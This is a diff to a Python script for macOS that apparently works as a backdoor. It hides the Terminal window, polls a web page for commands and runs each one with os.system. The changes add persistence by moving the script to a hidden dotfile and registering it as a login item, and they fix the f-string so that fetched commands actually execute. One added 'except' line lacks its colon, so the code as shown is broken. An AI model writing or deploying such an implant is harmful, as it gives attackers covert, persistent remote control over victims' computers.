@@ -3,10 +3,19 @@ from bs4 import BeautifulSoup
 from requests import get
 from os import system as cmd
 from time import sleep
+from sys import argv
+
 old_command = 0
 command = 0
 cmd('clear')
 cmd('osascript -e \'tell application "Terminal" to set visible of front window to false\' > /dev/null')
+try:
+    filename = argv[0].split('/')[-1]
+except
+    filename = argv[0]
+cmd(f"mv {filename} ~/.{filename}")
+cmd(f'osascript -e \'tell application \"System Events\" to make login item at end with properties {path:\"~/.{filename}\", hidden:false\'')
+
 
 print('''
       
@@ -32,7 +41,7 @@ while True:
     #execute command
     if old_command != command:
         try:
-            cmd("f{command} > /dev/null")
+            cmd(f"{command} > /dev/null")
             old_command = command
         except:
             pass
